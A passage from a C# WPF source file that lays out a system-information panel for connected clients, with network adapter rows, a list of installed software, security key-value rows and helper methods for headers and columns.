                    rowPanel.Children.Add(MakeCol(parts[0], 80));
                    rowPanel.Children.Add(MakeCol(parts[1], 120));
                    rowPanel.Children.Add(MakeCol(parts[2], 80));
                    rowPanel.Children.Add(MakeCol(parts[3], 80));
                    rowPanel.Children.Add(MakeCol(parts[4], 60));
                    rowPanel.Children.Add(MakeCol(parts[5], 80));
                    row.Child = rowPanel;
                    _infoPanel.Children.Add(row);
                }
            }

            // Network section
            if (nets.Count > 0)
            {
                AddCategoryHeader("Network");

                var netHeader = new Border
                {
                    Background = new SolidColorBrush(SurfaceLightColor),
                    Padding = new Thickness(8, 3, 8, 3),
                    Margin = new Thickness(8, 0, 8, 2),
                    CornerRadius = new CornerRadius(3)
                };
                var netGrid = new WrapPanel { Orientation = Orientation.Horizontal };
                netGrid.Children.Add(MakeCol("Adapter", 140));
                netGrid.Children.Add(MakeCol("IP Address", 140));
                netGrid.Children.Add(MakeCol("MAC", 100));
                netGrid.Children.Add(MakeCol("DNS", 140));
                netHeader.Child = netGrid;
                _infoPanel.Children.Add(netHeader);

                foreach (string n in nets)
                {
                    string[] parts = n.Split('|');
                    if (parts.Length < 4) continue;
                    var row = new Border
                    {
                        Background = new SolidColorBrush(SurfaceColor),
                        Padding = new Thickness(8, 2, 8, 2),
                        Margin = new Thickness(8, 0, 8, 1),
                        CornerRadius = new CornerRadius(2)
                    };
                    var rowPanel = new WrapPanel { Orientation = Orientation.Horizontal };
                    rowPanel.Children.Add(MakeCol(parts[0], 140));
                    rowPanel.Children.Add(MakeCol(parts[1], 140));
                    rowPanel.Children.Add(MakeCol(parts[2], 100));
                    rowPanel.Children.Add(MakeCol(parts[3], 140));
                    row.Child = rowPanel;
                    _infoPanel.Children.Add(row);
                }
            }

            // Software section
            if (progList.Count > 0)
            {
                AddCategoryHeader("Software (" + progList.Count + " installed)");
                var progBox = new TextBox
                {
                    Text = string.Join("\n", progList.ToArray()),
                    Background = new SolidColorBrush(SurfaceColor),
                    Foreground = new SolidColorBrush(TextPrimary),
                    BorderBrush = new SolidColorBrush(BorderClr),
                    FontSize = 10,
                    FontFamily = new FontFamily("Consolas"),
                    IsReadOnly = true,
                    VerticalScrollBarVisibility = ScrollBarVisibility.Auto,
                    MaxHeight = 200,
                    Padding = new Thickness(6),
                    Margin = new Thickness(8, 0, 8, 8)
                };
                _infoPanel.Children.Add(progBox);
            }

            // Security section
            if (categories.ContainsKey("Security") && categories["Security"].Count > 0)
            {
                AddCategoryHeader("Security");
                foreach (var kvp in categories["Security"])
                    AddInfoRow(kvp.Key, kvp.Value);
            }

            _statusLabel.Text = "Loaded " + lines.Length + " items";
        }

        private void AddCategoryHeader(string text)
        {
            var hdr = new Border
            {
                Background = new SolidColorBrush(SurfaceLightColor),
                Padding = new Thickness(10, 6, 10, 6),
                Margin = new Thickness(0, 4, 0, 2),
                CornerRadius = new CornerRadius(4),
                BorderBrush = new SolidColorBrush(BorderClr),
                BorderThickness = new Thickness(0, 0, 0, 1)
            };
            hdr.Child = new TextBlock
            {
                Text = text.ToUpper(),
                FontSize = 10,
                FontWeight = FontWeights.Bold,
                Foreground = new SolidColorBrush(AccentBlue)
            };
            _infoPanel.Children.Add(hdr);
        }

        private void AddInfoRow(string key, string value)
        {
            var row = new Border
            {
                Background = new SolidColorBrush(SurfaceColor),
                Padding = new Thickness(8, 3, 8, 3),
                Margin = new Thickness(8, 0, 8, 1),
                CornerRadius = new CornerRadius(2)
            };
            var panel = new DockPanel();
            var keyBlock = new TextBlock
            {
                Text = key,
                FontSize = 11,
                Foreground = new SolidColorBrush(TextSecondary),
                Width = 170,
                FontWeight = FontWeights.SemiBold
            };
            DockPanel.SetDock(keyBlock, Dock.Left);
            panel.Children.Add(keyBlock);
            var valBlock = new TextBlock
            {
                Text = value,
                FontSize = 11,
                Foreground = new SolidColorBrush(TextPrimary),
                TextWrapping = TextWrapping.Wrap
            };
            panel.Children.Add(valBlock);
            row.Child = panel;
            _infoPanel.Children.Add(row);
        }

        private TextBlock MakeCol(string text, double width)
        {
            return new TextBlock
            {
                Text = text,
                FontSize = 10,
                Foreground = new SolidColorBrush(TextSecondary),
                Width = width,
                TextTrimming = TextTrimming.CharacterEllipsis
            };
        }

        public void Dispose()
        {
            _clients.Clear();
            _clientInfo.Clear();
        }
    }
}

